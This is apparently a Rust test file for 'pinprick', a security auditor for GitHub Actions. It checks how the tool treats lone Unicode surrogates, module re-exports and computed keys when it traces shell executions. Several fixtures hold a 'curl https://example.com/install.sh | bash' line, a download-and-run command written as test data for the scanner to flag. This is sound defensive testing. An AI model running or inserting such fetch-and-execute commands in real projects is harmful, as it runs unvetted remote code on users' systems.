mod common;

const ACTION: &str = "name: strings\ndescription: test\nruns:\n  using: node20\n  main: index.js\n";

#[test]
fn lone_surrogates_are_incomplete_and_keep_reachable_findings() {
    for source in [
        r"'\uD800';",
        r"const text = '\uD800';",
        r"const text = '\uDC00';",
        r"const text = `\uD800`;",
        r"const text = `prefix${1}\uDC00`;",
        r"const text = '\uD800' + '\uDC00';",
        r"const object = {'\uD800': __dirname}; object['\\ud800'] = '.';",
        r"const object = {}; object['\uD800'] = __dirname;",
        r"class Paths { '\uD800' = __dirname; }",
        r"import './\uD800.js';",
        r"require('./\uD800.js');",
        r"import(`./\uD800.js`);",
        r"export { run } from './\uD800.js';",
        r"export * from './\uD800.js';",
        r"import { '\uD800' as run } from './helper.js';",
        r"const run = 1; export { run as '\uD800' };",
    ] {
        let source = format!("{source}\nrequire('./helper.js');");
        let dir = common::repo_with_local_action(
            ACTION,
            &[
                ("index.js", &source),
                (
                    "helper.js",
                    "require('child_process').execSync('curl https://example.com/install.sh | bash');",
                ),
            ],
        );
        let output = common::pinprick_cmd()
            .args(["--json", "audit", "--no-audited-catalog"])
            .arg(dir.path())
            .output()
            .unwrap();
        assert_eq!(output.status.code(), Some(2), "{source}");
        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(report["coverage_complete"], false, "{source}");
        assert!(
            report["findings"]
                .as_array()
                .unwrap()
                .iter()
                .any(|finding| {
                    finding["severity"] == "high"
                        && finding["source_file"]
                            .as_str()
                            .is_some_and(|path| path.ends_with("(helper.js)"))
                }),
            "{source}: {report}"
        );
    }
}

#[test]
fn ordinary_and_paired_surrogate_paths_remain_complete() {
    for source in [
        "execFileSync('bash', [__dirname + '/install.sh']);",
        r"const pattern = /\uD800/; execFileSync('bash', [__dirname + '/install.sh']);",
        "execFileSync('bash', [`${__dirname}/install.sh`]);",
        "const paths = {'script': __dirname + '/install.sh'}; execFileSync('bash', [paths['script']]);",
        r"execFileSync('bash', [__dirname + '/\uD83D\uDE80.sh']);",
        r"const marker = '\\ud800'; execFileSync('bash', [__dirname + '/install.sh']);",
        r"const marker = '�'; execFileSync('bash', [__dirname + '/install.sh']);",
        "import { execFileSync as execute } from 'node:child_process'; execute('bash', [__dirname + '/install.sh']);",
    ] {
        let dir = common::repo_with_local_action(
            ACTION,
            &[
                ("index.js", source),
                ("install.sh", "echo safe\n"),
                ("🚀.sh", "echo safe\n"),
            ],
        );
        let output = common::pinprick_cmd()
            .args(["--json", "audit", "--no-audited-catalog"])
            .arg(dir.path())
            .output()
            .unwrap();
        assert_eq!(
            output.status.code(),
            Some(0),
            "{source}: {}",
            String::from_utf8_lossy(&output.stdout)
        );
        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(report["coverage_complete"], true, "{source}");
    }
}

#[test]
fn computed_template_key_execution_is_incomplete() {
    let dir = common::repo_with_local_action(
        ACTION,
        &[
            (
                "index.js",
                "const paths = {script: __dirname + '/install.sh'}; const key = `script`; execFileSync('bash', [paths[key]]);",
            ),
            ("install.sh", "echo safe\n"),
        ],
    );
    common::pinprick_cmd()
        .args(["--json", "audit", "--no-audited-catalog"])
        .arg(dir.path())
        .assert()
        .code(2);
}

#[test]
fn ordinary_imports_and_reexports_keep_located_arguments() {
    for bridge in [
        "export { run } from './helper.js';",
        "export { run as 'run' } from './helper.js';",
        "export * from './helper.js';",
        "module.exports = require('./helper.js');",
    ] {
        let dir = common::repo_with_local_action(
            ACTION,
            &[
                (
                    "index.js",
                    "const {run} = require('./bridge.js'); run(__dirname);",
                ),
                ("bridge.js", bridge),
                (
                    "helper.js",
                    "export function run(root) { execFileSync('bash', [root + '/install.sh']); }",
                ),
                ("install.sh", "curl https://example.com/install.sh | bash\n"),
            ],
        );
        let output = common::pinprick_cmd()
            .args(["--json", "audit", "--no-audited-catalog"])
            .arg(dir.path())
            .output()
            .unwrap();
        assert_eq!(
            output.status.code(),
            Some(1),
            "{bridge}: {}",
            String::from_utf8_lossy(&output.stdout)
        );
        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(report["coverage_complete"], true, "{bridge}");
        assert!(
            report["findings"]
                .as_array()
                .unwrap()
                .iter()
                .any(|finding| {
                    finding["source_file"]
                        .as_str()
                        .is_some_and(|path| path.ends_with("(install.sh)"))
                }),
            "{bridge}: {report}"
        );
    }
}

#[test]
fn lone_surrogates_fail_closed_in_every_output_format() {
    let dir = common::repo_with_local_action(ACTION, &[("index.js", r"const text = '\uD800';")]);
    for format in [None, Some("--json"), Some("--sarif"), Some("--html")] {
        let mut command = common::pinprick_cmd();
        if let Some(format) = format {
            command.arg(format);
        }
        command
            .args(["audit", "--no-audited-catalog"])
            .arg(dir.path())
            .assert()
            .code(2);
    }
}

#[test]
fn lone_surrogates_keep_resolved_executions_and_module_arguments() {
    for execution in [
        "execFileSync('bash', [__dirname + '/install.sh']);",
        "import { run } from './helper.js'; run(__dirname);",
    ] {
        let source = format!(r"const unknown = '\uD800'; {execution}");
        let dir = common::repo_with_local_action(
            ACTION,
            &[
                ("index.js", &source),
                (
                    "helper.js",
                    "export function run(root) { execFileSync('bash', [root + '/install.sh']); }",
                ),
                ("install.sh", "curl https://example.com/install.sh | bash\n"),
            ],
        );
        let output = common::pinprick_cmd()
            .args(["--json", "audit", "--no-audited-catalog"])
            .arg(dir.path())
            .output()
            .unwrap();
        assert_eq!(output.status.code(), Some(2), "{source}");
        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(report["coverage_complete"], false, "{source}");
        assert!(
            report["findings"]
                .as_array()
                .unwrap()
                .iter()
                .any(|finding| {
                    finding["source_file"]
                        .as_str()
                        .is_some_and(|path| path.ends_with("(install.sh)"))
                }),
            "{source}: {report}"
        );
    }
}
